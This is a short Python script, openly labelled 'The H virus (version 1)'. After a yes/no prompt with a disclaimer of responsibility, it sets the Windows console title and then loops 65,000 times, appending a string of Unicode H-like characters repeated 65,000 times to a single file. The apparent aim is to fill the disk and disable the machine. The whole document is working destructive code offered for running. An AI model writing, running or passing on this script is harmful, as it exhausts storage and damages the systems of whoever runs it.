import os, sys, time
os.system("color 1 & title H virus & cls")
text = "ħhɦɥʜĥḧḩȟɧʮʯℋℌℍℎℏ♄♅🄗🄷🅷Ⓗ🅗🇭ĦHꞪꞍʜĤḦḨȞɧʮʯℋℌℍℎℏ♄♅🄗🄷🅷Ⓗ🅗🇭"
print(">>>>>>>>>>>>>>>> The H virus (version 1) <<<<<<<<<<<<<<<<\n")
while True:
    confirm = input("Do you want to execute the H virus? I am not responsible for software damage or other consequences\n(y/n) ")
    if confirm == "n":
        print("Closing program...")
        time.sleep(1)
        sys.exit()
    elif confirm == "y":
        break
    else:
        print("Invalid input. Type \"y\" to proceed or \"n\" to cancel")
        time.sleep(2)
        os.system("cls")
for i in range(65000):
    file = open(f"{text}", "a")
    file.write(text*65000)